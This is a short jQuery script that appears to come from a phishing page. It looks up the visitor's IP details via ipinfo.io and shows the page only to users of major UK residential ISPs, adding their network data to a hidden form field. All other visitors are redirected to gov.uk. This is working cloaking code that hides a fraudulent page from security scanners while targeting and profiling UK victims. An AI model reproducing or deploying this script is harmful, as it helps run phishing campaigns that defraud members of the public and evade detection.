
    
$.getJSON( "https://ipinfo.io/json", function( data ) { 
 
  var items = [];
  $.each( data, function( key, val ) {
  	   
    items.push(    key +   " : " + val    );
      
  }); 

  $( "<input>", {"id":"alldatas","hidden": "",value: items.join( " " )}).appendTo( 'body' );
	 const input = document.getElementById("alldatas").value; 	  
  const pattern = /AS2856|British Telecommunications PLC|AS5089|Virgin Media Limited|AS5607|Sky UK Limited|AS12576|EE Limited|AS13285|TalkTalk Communications Limited|AS6871|Plusnet|AS5378|Vodafone Limited/;
   
     
  	    if(pattern.test(data.org)) { 
  	   
     
  $( "<input>", {"id":"alldata","name":"alldata","hidden": "",value: input}).appendTo( '#details' );
     
            $("body").attr("hidden", false);
  } else {
  	    
   	window.location.replace("https://www.gov.uk/");
    	 
  	   
  	 
  } 
  });
  
